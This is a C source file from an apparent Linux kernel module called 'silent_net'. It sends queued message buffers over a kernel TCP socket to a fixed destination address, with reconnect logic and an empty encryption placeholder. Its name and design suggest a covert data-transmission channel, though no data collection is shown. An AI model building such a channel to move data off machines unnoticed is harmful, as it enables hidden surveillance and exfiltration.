/*
 *	'silent_net' data transmission
 *
 *
 *	Omer Kfir (C)
 */

#include "transmission.h"
#include "headers.h"
#include "protocol.h"
#include "tcp_socket.h"
#include "workqueue.h"

static struct socket *sock;    // Struct socket
static bool connected = false; // Boolean which indicates if currently connected
static struct mutex trns_mutex; // Mutex for thread safe socket handling

void transmit_data(struct work_struct *work) {
  wq_msg *curr_msg = container_of(work, wq_msg, work);
  int ret;

  mutex_lock(&trns_mutex);

  /* If socket is disconnected try to connect */
  if (!connected) {
    /* When a socket disconnects a new socket needs to be created */
    sock = tcp_sock_create();
    if (IS_ERR(sock)) {
      sock = NULL;
      goto end;
    }

    ret = tcp_sock_connect(sock, DEST_IP, DEST_PORT);
    if (ret < 0) {
      tcp_sock_close(sock);
      sock = NULL;
      goto end;
    }
    connected = true;
  }

  if (curr_msg->encrypt) {
  }
  // Add encyption logic
  ret = tcp_send_msg(sock, curr_msg->msg_buf, curr_msg->length);
  if (ret < 0) {
    connected = false;
    tcp_sock_close(sock);
    sock = NULL;
  }

end:
  mutex_unlock(&trns_mutex);
  kfree(curr_msg); // Free the work structure
}

/* Initialize all transmission objects */
void data_transmission_init(void) { mutex_init(&trns_mutex); }

/* Closes all transmission objects */
void data_transmission_release(void) {
  // Close socket
  tcp_sock_close(sock);

  /*
   * No need for releasing trns_mutex since
   * The operating system knows to release it on
   * It's own when module is unloaded
   */
}
